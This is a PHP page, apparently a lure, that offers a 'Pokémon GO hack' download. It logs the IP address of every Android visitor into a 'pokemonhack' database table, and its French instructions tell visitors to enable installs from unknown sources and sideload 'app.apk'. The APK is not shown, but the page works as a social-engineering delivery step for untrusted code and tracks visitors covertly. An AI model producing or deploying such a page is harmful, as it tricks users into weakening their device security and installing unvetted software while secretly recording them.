<?php 
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
if(stripos($ua,'android') !== false) { // && stripos($ua,'mobile') !== false) {
	//echo "android";
	echo $_SERVER["REMOTE_ADDR"];
	$pdo = new PDO('mysql:host=localhost;dbname=pokemon', 'root', '', array(PDO::ATTR_ERRMODE => PDO::ERRMODE_WARNING));
	$req = $pdo->prepare("INSERT INTO pokemonhack (ip) VALUES(:ip)");

	$req->execute(array(
		"ip" => $_SERVER["REMOTE_ADDR"], 
		));

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
	<link rel="stylesheet" type="text/css" href="style.css">
	<link href='https://fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'>
</head>
<body>
	<header>
		<div id="poke"></div>
	</header>
	<div id="mobil">
		<img src="mobile.jpg">
	</div>
	<div id="tuto">
		<p>Salut ! Pour que le hack PokémonGO fonctionne correctement, suis les étapes ci dessous :</p>
		<ol style="font-size: 14px;">
			<li>Active dans les paramètre sécurité l'installation d'application de Source inconnues</li><br/>
			<li>Télécharge le fichier</li><br/>
			<li>Clic sur le fichier .apk et installe l'application</li><br/>
			<li>Une fois installer lance l'application MainActivity</li><br/>
			<li>Pour une meilleur sécurité désactive dans les paramètre sécurité l'installation d'application de Source inconnues</li>
		</ol>
	</div>
	<a href="app.apk">
		
	<input type="submit" value="Download hack PokémonGO">
	</a
></body>
</html>